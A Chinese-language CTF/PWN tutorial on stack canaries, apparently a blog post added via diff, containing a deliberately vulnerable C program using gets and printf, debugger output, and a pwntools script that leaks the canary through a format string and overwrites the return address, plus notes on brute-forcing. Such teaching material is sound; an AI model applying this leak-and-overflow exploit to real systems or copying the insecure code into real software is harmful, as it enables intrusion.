@@ -1,0 +1,239 @@
+---
+title: 'Canaries'
+date: '2023-08-21'
+lastmod: '2023-08-22'
+tags: ['PWN', 'Stack']
+draft: false
+summary: '防御缓冲区溢出'
+authors: ['default']
+---
+
+Canary 的意思是金丝雀，源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。
+工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感
+就会停止鸣叫甚至死亡，从而使工人们得到预警。
+
+Canary 的设计非常简单——在函数的开头，一个随机值被放置在栈上，作为检测用的保护值。
+在程序执行 `ret` 之前，程序会检查该值是否被修改过：如果没有被改变，则说明没有发生
+缓冲区溢出；反之，说明发生了栈溢出，程序会中止。
+
+这种通过检查保护值的手段，可以缓解栈溢出的攻击行为。因为保护值的位置在保存的基
+地址和返回地址之间，是栈溢出的常见目标位置。攻击者无法跳过保护值直接修改返回
+地址等关键数据。这样简单有效的检测机制，可以大大增强程序的安全性。
+
+:::info
+在 Linux 上，Canary 设计为以 `\x00` 结尾。本意是为了保证 Canary 可以截断字符串。
+如果你在用输出函数的时候处理错了字符串，导致打印的字符串超出了 Canary 的位置，
+这个 `\x00` 可以终止字符串的输出，防止越界访问 Canary 的值；同时空字节 `\x00` 也
+会中断字符串打印，不会错误打印后面栈上的内容。但是这也使它很容易被识别出来：
+攻击者可以通过输出一个可能的 Canary 值，并检验末尾是否为 `\x00` 来判断真正的
+Canary 是多少。
+:::
+
+## 0x01 绕过 Canary
+
+有两种常用的方法可以绕过 Canary。
+
+### 1x01 泄漏 Canary
+
+获取 Canary 的值的方法因程序而异，没有固定的万能方式。但主要的目的是获取它的值。
+最简单的方法是，如果程序存在格式化字符串漏洞的话，可以利用这个漏洞来泄漏栈上的
+内容。因为 Canary 和其它局部变量一样，位于栈上。
+
+```c:source.c
+#include <stdio.h>
+
+void vuln() {
+  char buffer[64];
+
+  puts("Leak me");
+  gets(buffer);
+
+  printf(buffer);
+  puts("");
+
+  puts("Overflow me");
+  gets(buffer);
+}
+
+int main() {
+  vuln();
+}
+
+void win() {
+  puts("You won!");
+}
+```
+
+#### 2x01 32-bit
+
+LINK
+
+首先，让我们检查一下是否有 Canary：
+
+```
+$ pwn checksec vuln-32
+[*] 'vuln-32'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+现在我们需要计算 Canary 所在的偏移量，为此我们将使用 pwndbg。
+
+```
+$ pwndbg vuln-32
+
+$ b *0x080491d7
+$ r
+Leak me
+%p
+
+Breakpoint 1, 0x080491d7 in vuln ()
+[...]
+$ x/24wx $esp
+0xffffd6e0:	0xffffd6fc	0x00000001	0xf7ffda20	0x0804919e
+0xffffd6f0:	0x00000000	0xffffd9ab	0x00000002	0x00007025
+0xffffd700:	0xf7ffcfd8	0x00000028	0x00000000	0xffffdfcd
+0xffffd710:	0xf7fc6570	0xf7fc6000	0x00000000	0x00000000
+0xffffd720:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd730:	0xffffffff	0xf7c0c850	0xf7fc0380	0x437aa500
+```
+
+最后一个输出的值是 Canary。我们可以从以下几点来判断：
+
+1. 它距离缓冲区开始的地址约 64 字节，这很接近缓冲区末尾的位置。
+2. 它的末尾是 `\x00` ，和以 `ff` 和 `f7` 开头的 libc 库地址不同，看起来非常随机。
+
+从缓冲区开始，我们大约输出了 24 个地址，然后可以找到 Canary 的值。所以我们可以
+在它前后各输出一个地址，来确定 Canary 的位置。
+
+```
+$ ./vuln-32
+Leak me
+%23$p %24$p %25$p
+0x4c1e00 (nil) 0xf7e43e34
+```
+
+似乎是 `%23$p`。
+
+*注：Canary 对于每个新进程都是随机的，因此不会相同。*
+
+现在让我们用 pwntools 自动抓取 Canary：
+
+```python:canary.py
+from pwn import *
+
+context.log_level = 'debug'
+
+p = process('./vuln-32')
+
+log.info(p.clean())
+p.sendline('%23$p')
+
+canary = int(p.recvline(), 16)
+log.success(f'Canary: {hex(canary)}')
+```
+
+```
+$ python exp.py
+[+] Starting local process './vuln-32': pid 10042
+[*] Leak me
+[+] Canary: 0x143e3e00
+```
+
+现在剩下的就是计算出 Canary 之前的偏移量，然后计算出 Canary 之后到返回地址的偏移量。
+
+```
+$ pwndbg vuln-32
+$ b *0x080491d7
+$ r
+Leak me
+%23$p
+
+Breakpoint 1, 0x080491d7 in vuln ()
+[...]
+$ x/24wx $esp
+0xffffd6e0:	0xffffd6fc	0x00000001	0xf7ffda20	0x0804919e
+0xffffd6f0:	0x00000000	0xffffd9ab	0x00000002	0x24333225
+0xffffd700:	0xf7ff0070	0x00000028	0x00000000	0xffffdfcd
+0xffffd710:	0xf7fc6570	0xf7fc6000	0x00000000	0x00000000
+0xffffd720:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd730:	0xffffffff	0xf7c0c850	0xf7fc0380	0xf5dafb00
+```
+
+我们看到 Canary 位于 `0xffffd73c` 。稍后，假设返回地址位于 `0xffffd74c` 。让我们
+在下一个 `gets()` 之后中断并检查我们用什么值覆盖它。
+
+```
+$ b *0x0804920f
+$ c
+Continuing.
+0x915d8a00
+Overflow me
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+Breakpoint 2, 0x0804920f in vuln ()
+[...]
+$ x/20wx 0xffffd73c
+0xffffd73c:	0x61616171	0x61616172	0x61616173	0x61616174
+0xffffd74c:	0x61616175	0x61616176	0x61616177	0x61616178
+```
+
+现在，我们可以检查 Canary 和 EIP 偏移量：
+
+```
+$ cyclic -l 0x61616171
+Finding cyclic pattern of 4 bytes: b'qaaa' (hex: 0x71616161)
+Found at offset 64
+$ cyclic -l 0x61616175
+Finding cyclic pattern of 4 bytes: b'uaaa' (hex: 0x75616161)
+Found at offset 80
+```
+
+返回地址是 Canary 开始后的 16 个字节，因此是 Canary 后的 12 个字节。
+
+```python:exp.py
+from pwn import *
+
+context.log_level = 'debug'
+
+p = process('./vuln-32')
+
+log.info(p.clean())
+p.sendline('%23$p')
+
+canary = int(p.recvline(), 16)
+log.success(f'Canary: {hex(canary)}')
+
+payload = b'A' * 64
+payload += p32(canary)  # 用 Canary 值覆盖 Canary 以不触发检测
+payload += b'A' * 12    # Padding 到返回地址
+payload += p32(0x08049245)
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+#### 2x02 64-bit
+
+方法同上，只是变成了 64-bit。
+
+:::info
+只要注意：在 64-bit 中，字符串首先进入相关寄存器，每个地址可以容纳 8 字节，
+因此偏移量可能不同。
+:::
+
+LINK
+
+### 1x02 暴力破解 Canary
+
+这在 32-bit 上是可能的，有时也是不可避免的。但在 64-bit 上这种方法是不可行的。
+因为 32-bit 的 Canary 值通常为 4 字节，爆破遍历空间较小，可行性高；但 64-bit
+扩展到 8 字节，遍历空间极大，爆破难度大幅提高。
+
+总体思路是通过大量运行目标进程，每次使用随机 Canary 值来碰撞正确的 Canary 值。
+但需要明确的指示来判断爆破是否成功，例如出现已知明文 `flag{` 。这需要大量时间。
+
